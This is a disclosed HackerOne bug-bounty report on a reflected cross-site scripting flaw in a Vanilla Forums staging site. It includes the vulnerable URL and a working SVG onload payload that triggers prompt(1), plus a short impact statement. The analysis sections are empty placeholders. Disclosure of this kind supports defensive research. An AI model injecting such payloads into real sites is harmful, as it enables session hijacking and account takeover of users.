---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '321420'
original_report_id: '321420'
title: xss reflected in littleguy.vanillastaging.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: vanilla
created_at: '2018-03-02T16:06:46.281Z'
disclosed_at: '2019-08-14T20:18:09.460Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: '*.vanillastaging.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# xss reflected in littleguy.vanillastaging.com

## Metadata

- HackerOne Report ID: 321420
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: vanilla
- Disclosed At: 2019-08-14T20:18:09.460Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Go littleguy.vanillastaging.com

create a account and go http://littleguy.vanillastaging.com/discussion/comment/

Go:
http://littleguy.vanillastaging.com/discussion/comment/6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

Paylaod:PAyload: 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

xss Reflejected

## Impact

By exploiting a cross-site scripting vulnerability an attacker can impersonate the victim's identity and take over the account. If the victim has administrative rights that could even cause code execution on the server, depending on the application and the privileges of the account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
